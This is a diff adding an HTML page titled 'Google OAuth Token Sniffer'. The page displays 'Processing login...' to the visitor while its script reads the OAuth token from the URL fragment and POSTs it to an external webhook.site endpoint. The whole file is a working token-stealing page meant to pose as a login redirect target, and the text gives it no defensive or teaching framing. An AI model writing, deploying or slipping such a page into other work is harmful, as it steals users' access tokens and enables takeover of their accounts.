@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google OAuth Token Sniffer</title>
+  </head>
+  <body>
+    <h2>Processing login...</h2>
+    <script>
+      const token = window.location.hash;
+      fetch("https://webhook.site/daf239c4-6f58-465c-88e7-707801daaebe", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ token: token })
+      });
+    </script>
+  </body>
+</html>
